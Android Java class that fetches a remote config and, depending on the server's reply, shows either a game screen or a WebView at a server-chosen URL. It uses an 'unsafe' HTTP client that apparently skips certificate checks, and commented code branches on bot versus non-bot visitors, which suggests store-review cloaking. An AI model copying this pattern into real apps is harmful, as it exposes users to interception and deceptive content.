package org.apache.cordova.repository.impl;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;

import androidx.annotation.Keep;
import androidx.preference.PreferenceManager;

import com.google.gson.Gson;
import com.google.gson.annotations.Expose;
import com.google.gson.annotations.SerializedName;
import com.walhalla.ui.DLog;

import org.apache.cordova.http.HttpClient;
import org.apache.cordova.ScreenType;
import org.apache.cordova.domen.Dataset;
import org.apache.cordova.repository.AbstractDatasetRepository;

import org.apache.mvp.presenter.MainPresenter;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.io.Serializable;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;


/**
 * Get URL From Server
 */

public class KwkRemoteRepository extends AbstractDatasetRepository
        implements Callback {

    private final String _URL_;
    private final Handler handler;

    public KwkRemoteRepository(Handler handler, String _URL_, Context context) {
        super(context);
        this._URL_ = _URL_;
        this.handler = handler;
    }

    @Override
    public void getConfig(Context context) {

        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        String url = MainPresenter.makeUrl(_URL_, preferences, context);
        DLog.d("@@" + url);
        OkHttpClient client = HttpClient.getUnsafeOkHttpClient(context);
        try {
            Request request = new Request.Builder().url(url).build();
            Call call = client.newCall(request);
            call.enqueue(this);
        } catch (Exception e) {
            DLog.handleException(e);
        }
    }

    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        DLog.handleException(e);
        //handler.post(() -> {
        callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
        //});
    }


    String json = "";

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

        ResponseBody body = response.body();
        json = "";
        if (body != null) {
            json = body.string();
        }
        handler.post(() -> {
//            if (Config.TAG_NOBOT.equals(var0)) {
//                makeScreen(new Dataset(WEB_VIEW, "https://google.com"));
//            } else if (Const.TAG_BOT.equals(var0)) {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            } else {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            }

            if (json.isEmpty()) {
                callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
            } else {
                try {
                    DLog.d("{*} " + json);
                    Gson gson = new Gson();
                    KwkResponse entity = gson.fromJson(json, KwkResponse.class);
                    Dataset aa = new Dataset(ScreenType.WEB_VIEW, entity.url);
                    aa.enabled = true;
                    callback.successResponse(aa);
                } catch (Exception e) {
                    DLog.handleException(e);
                }
            }
        });
    }


    @Keep
    public static class KwkResponse implements Serializable {

        @SerializedName("flag")
        @Expose
        public String flag;
        @SerializedName("url")
        @Expose
        public String url;
        @SerializedName("ip")
        @Expose
        public String ip;


        public KwkResponse() {}
    }
}
